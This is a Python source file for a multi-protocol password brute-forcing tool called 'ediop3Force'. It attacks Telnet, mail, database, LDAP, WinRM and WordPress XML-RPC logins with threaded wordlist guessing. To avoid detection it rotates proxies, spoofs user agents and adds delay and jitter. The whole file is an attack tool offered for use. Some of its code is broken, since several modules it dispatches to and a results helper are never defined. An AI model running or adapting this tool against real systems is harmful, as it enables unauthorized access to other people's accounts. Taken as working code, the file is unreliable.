import cmd
import requests
import threading
import time
import os
import random
import json
from queue import Queue
from fake_useragent import UserAgent
import asyncio
from tqdm import tqdm
import smtplib
import ftplib
from pyrdp import rdp
from bs4 import BeautifulSoup
import paramiko
import socks
import socket
import urllib3
from datetime import datetime
import subprocess
import telnetlib
import imaplib
import poplib
import mysql.connector
import psycopg2
import pymssql
import ldap3
import winrm
import xmlrpc.client

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ediop3Force(cmd.Cmd):
    prompt = "ediop3Force> "
    intro = """
    ███████╗██████╗ ██╗ ██████╗ ██████╗ ██████╗ ██████╗
    ██╔════╝██╔══██╗██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
    █████╗  ██║  ██║██║██║   ██║██████╔╝██████╔╝██████╔╝
    ██╔══╝  ██║  ██║██║██║   ██║██╔═══╝ ██╔══██╗██╔══██╗
    ███████╗██████╔╝██║╚██████╔╝██║     ██║  ██║██║  ██║
    ╚══════╝╚═════╝ ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝

    ediop3Force Framework
    Type 'help' for commands.
    """

    def __init__(self):
        super().__init__()
        self.target = None
        self.port = None
        self.username = None
        self.wordlist = None
        self.module = None
        self.threads = 100
        self.timeout = 15
        self.rate_limit = 0.05
        self.results = []
        self.proxies = []
        self.user_agents = []
        self.lock = threading.Lock()
        self.proxy_rotation_interval = 3
        self.last_proxy_refresh = 0
        self._init_proxies()
        self._init_user_agents()
        self.verbose = False
        self.max_retries = 3
        self.success_count = 0
        self.attempt_count = 0
        self.evasion_level = 1
        self.delay = 0
        self.jitter = 0

    def _init_proxies(self):
        proxy_file = "proxy.txt"
        try:
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(self.proxies)} proxies from {proxy_file}")
                self.last_proxy_refresh = time.time()
            else:
                self.proxies = []
        except Exception:
            self.proxies = []

    def _rotate_proxies(self):
        if time.time() - self.last_proxy_refresh > self.proxy_rotation_interval:
            self._init_proxies()

    def _get_random_proxy(self):
        self._rotate_proxies()
        try:
            if not self.proxies:
                return None
            proxy = random.choice(self.proxies)
            if '@' in proxy:
                return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            return {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
        except Exception:
            return None

    def _init_user_agents(self):
        try:
            ua = UserAgent()
            self.user_agents = [ua.random for _ in range(500)]
        except Exception:
            self.user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36']

    def _get_random_user_agent(self):
        return random.choice(self.user_agents)

    def _apply_evasion(self):
        if self.evasion_level > 0:
            time.sleep(self.delay + random.uniform(0, self.jitter))
            if self.evasion_level > 1:
                time.sleep(random.uniform(0.1, 0.5))

    def do_set(self, arg):
        args = arg.split()
        if len(args) != 2:
            print("Usage: set <option> <value>")
            return
        option, value = args
        if option == "target":
            self.target = value
        elif option == "port":
            self.port = int(value)
        elif option == "username":
            self.username = value
        elif option == "threads":
            self.threads = max(1, min(int(value), 1000))
        elif option == "rate":
            self.rate_limit = max(0.01, min(float(value), 10))
        elif option == "verbose":
            self.verbose = value.lower() in ("true", "1", "yes")
        elif option == "retries":
            self.max_retries = max(1, min(int(value), 10))
        elif option == "evasion":
            self.evasion_level = max(0, min(int(value), 3))
        elif option == "delay":
            self.delay = max(0, min(float(value), 5))
        elif option == "jitter":
            self.jitter = max(0, min(float(value), 2))
        else:
            print("Invalid option.")

    def do_use(self, arg):
        modules = ["ssh", "http", "ftp", "smtp", "rdp", "webmail", "telnet", "imap", 
                  "pop3", "mysql", "postgres", "mssql", "ldap", "winrm", "xmlrpc"]
        if arg in modules:
            self.module = arg
            print(f"Module set: {arg}")
        else:
            print(f"Available modules: {', '.join(modules)}")

    def do_load(self, arg):
        try:
            if not os.path.exists(arg):
                print("Wordlist not found.")
                return
            with open(arg, 'r', errors='ignore') as f:
                self.wordlist = [line.strip() for line in f if line.strip()]
            print(f"Loaded {len(self.wordlist)} passwords.")
        except Exception as e:
            print(f"Error loading wordlist: {e}")

    def do_run(self, arg):
        if not all([self.target, self.module, self.wordlist]):
            print("Missing target, module, or wordlist.")
            return

        print(f"Starting {self.module} brute force on {self.target}...")
        print(f"Threads: {self.threads}, Rate: {self.rate_limit} req/s")
        start_time = time.time()
        self.success_count = 0
        self.attempt_count = 0

        if self.module == "ssh":
            asyncio.run(self._run_ssh_brute())
        elif self.module == "http":
            self._run_http_brute()
        elif self.module == "ftp":
            self._run_ftp_brute()
        elif self.module == "smtp":
            asyncio.run(self._run_smtp_brute())
        elif self.module == "rdp":
            self._run_rdp_brute()
        elif self.module == "webmail":
            self._run_webmail_brute()
        elif self.module == "telnet":
            self._run_telnet_brute()
        elif self.module == "imap":
            self._run_imap_brute()
        elif self.module == "pop3":
            self._run_pop3_brute()
        elif self.module == "mysql":
            self._run_mysql_brute()
        elif self.module == "postgres":
            self._run_postgres_brute()
        elif self.module == "mssql":
            self._run_mssql_brute()
        elif self.module == "ldap":
            self._run_ldap_brute()
        elif self.module == "winrm":
            self._run_winrm_brute()
        elif self.module == "xmlrpc":
            self._run_xmlrpc_brute()

        elapsed = time.time() - start_time
        print(f"\nAttack completed in {elapsed:.2f} seconds")
        print(f"Total attempts: {self.attempt_count}")
        print(f"Successful logins: {self.success_count}")

    def _run_telnet_brute(self):
        if not self.port:
            self.port = 23
        print(f"Targeting Telnet on {self.target}:{self.port}")

        def telnet_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    tn = telnetlib.Telnet(self.target, self.port, timeout=self.timeout)
                    tn.read_until(b"login: ")
                    tn.write(self.username.encode('ascii') + b"\n")
                    tn.read_until(b"Password: ")
                    tn.write(password.encode('ascii') + b"\n")
                    response = tn.read_some()
                    if b"Login incorrect" not in response:
                        with self.lock:
                            result = f"{self.username}:{password} (Telnet)"
                            print(f"CRACKED PASSWORD: {result}")
                            self._add_result(result)
                            self.success_count += 1
                        tn.close()
                        return
                    tn.close()
                except Exception:
                    pass
                self._apply_evasion()

        self._threaded_attack(telnet_worker)

    def _run_imap_brute(self):
        if not self.port:
            self.port = 143
        print(f"Targeting IMAP on {self.target}:{self.port}")

        def imap_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    if self.port == 993:
                        imap = imaplib.IMAP4_SSL(self.target, self.port)
                    else:
                        imap = imaplib.IMAP4(self.target, self.port)
                    imap.login(self.username, password)
                    with self.lock:
                        result = f"{self.username}:{password} (IMAP)"
                        print(f"CRACKED PASSWORD: {result}")
                        self._add_result(result)
                        self.success_count += 1
                    imap.logout()
                    return
                except Exception:
                    pass
                self._apply_evasion()

        self._threaded_attack(imap_worker)

    def _run_pop3_brute(self):
        if not self.port:
            self.port = 110
        print(f"Targeting POP3 on {self.target}:{self.port}")

        def pop3_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    if self.port == 995:
                        pop = poplib.POP3_SSL(self.target, self.port)
                    else:
                        pop = poplib.POP3(self.target, self.port)
                    pop.user(self.username)
                    pop.pass_(password)
                    with self.lock:
                        result = f"{self.username}:{password} (POP3)"
                        print(f"CRACKED PASSWORD: {result}")
                        self._add_result(result)
                        self.success_count += 1
                    pop.quit()
                    return
                except Exception:
                    pass
                self._apply_evasion()

        self._threaded_attack(pop3_worker)

    def _run_mysql_brute(self):
        if not self.port:
            self.port = 3306
        print(f"Targeting MySQL on {self.target}:{self.port}")

        def mysql_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    conn = mysql.connector.connect(
                        host=self.target,
                        port=self.port,
                        user=self.username,
                        password=password,
                        connection_timeout=self.timeout
                    )
                    if conn.is_connected():
                        with self.lock:
                            result = f"{self.username}:{password} (MySQL)"
                            print(f"CRACKED PASSWORD: {result}")
                            self._add_result(result)
                            self.success_count += 1
                        conn.close()
                        return
                except Exception:
                    pass
                self._apply_evasion()

        self._threaded_attack(mysql_worker)

    def _run_postgres_brute(self):
        if not self.port:
            self.port = 5432
        print(f"Targeting PostgreSQL on {self.target}:{self.port}")

        def postgres_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    conn = psycopg2.connect(
                        host=self.target,
                        port=self.port,
                        user=self.username,
                        password=password,
                        connect_timeout=self.timeout
                    )
                    with self.lock:
                        result = f"{self.username}:{password} (PostgreSQL)"
                        print(f"CRACKED PASSWORD: {result}")
                        self._add_result(result)
                        self.success_count += 1
                    conn.close()
                    return
                except Exception:
                    pass
                self._apply_evasion()

        self._threaded_attack(postgres_worker)

    def _run_mssql_brute(self):
        if not self.port:
            self.port = 1433
        print(f"Targeting MSSQL on {self.target}:{self.port}")

        def mssql_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    conn = pymssql.connect(
                        server=self.target,
                        port=self.port,
                        user=self.username,
                        password=password,
                        login_timeout=self.timeout
                    )
                    with self.lock:
                        result = f"{self.username}:{password} (MSSQL)"
                        print(f"CRACKED PASSWORD: {result}")
                        self._add_result(result)
                        self.success_count += 1
                    conn.close()
                    return
                except Exception:
                    pass
                self._apply_evasion()

        self._threaded_attack(mssql_worker)

    def _run_ldap_brute(self):
        if not self.port:
            self.port = 389
        print(f"Targeting LDAP on {self.target}:{self.port}")

        def ldap_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    server = ldap3.Server(self.target, port=self.port)
                    conn = ldap3.Connection(
                        server,
                        user=self.username,
                        password=password,
                        auto_bind=True
                    )
                    if conn.bind():
                        with self.lock:
                            result = f"{self.username}:{password} (LDAP)"
                            print(f"CRACKED PASSWORD: {result}")
                            self._add_result(result)
                            self.success_count += 1
                        conn.unbind()
                        return
                except Exception:
                    pass
                self._apply_evasion()

        self._threaded_attack(ldap_worker)

    def _run_winrm_brute(self):
        if not self.port:
            self.port = 5985
        print(f"Targeting WinRM on {self.target}:{self.port}")

        def winrm_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    session = winrm.Session(
                        self.target,
                        auth=(self.username, password),
                        transport='ntlm',
                        server_cert_validation='ignore'
                    )
                    r = session.run_cmd('whoami')
                    if r.status_code == 0:
                        with self.lock:
                            result = f"{self.username}:{password} (WinRM)"
                            print(f"CRACKED PASSWORD: {result}")
                            self._add_result(result)
                            self.success_count += 1
                        return
                except Exception:
                    pass
                self._apply_evasion()

        self._threaded_attack(winrm_worker)

    def _run_xmlrpc_brute(self):
        if not self.port:
            self.port = 80
        print(f"Targeting XML-RPC on {self.target}:{self.port}")

        def xmlrpc_worker(password):
            self.attempt_count += 1
            for attempt in range(self.max_retries):
                try:
                    proxy = self._get_random_proxy()
                    headers = {'User-Agent': self._get_random_user_agent()}
                    url = f"http://{self.target}:{self.port}/xmlrpc.php"
                    data = f"""<?xml version="1.0"?>
                    <methodCall>
                        <methodName>wp.getUsersBlogs</methodName>
                        <params>
                            <param><value>{self.username}</value></param>
                            <param><value>{password}</value></param>
                        </params>
                    </methodCall>"""
                    r = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=self.timeout, verify=False)
                    if "isAdmin" in r.text:
                        with self.lock:
                            result = f"{self.username}:{password} (XML-RPC)"
                            print(f"CRACKED PASSWORD: {result}")
                            self._add_result(result)
                            self.success_count += 1
                        return
                except Exception:
                    pass
                self._apply_evasion()

        self._threaded_attack(xmlrpc_worker)

    def _threaded_attack(self, func):
        queue = Queue()
        for pw in self.wordlist:
            queue.put(pw)

        with tqdm(total=len(self.wordlist)) as pbar:
            def worker():
                while not queue.empty():
                    pw = queue.get()
                    try:
                        func(pw)
                    except Exception:
                        pass
                    time.sleep(self.rate_limit)
                    queue.task_done()
                    pbar.update(1)

            threads = []
            for _ in range(min(self.threads, len(self.wordlist))):
                t = threading.Thread(target=worker)
                t.daemon = True
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

if __name__ == '__main__':
    ediop3Force().cmdloop()
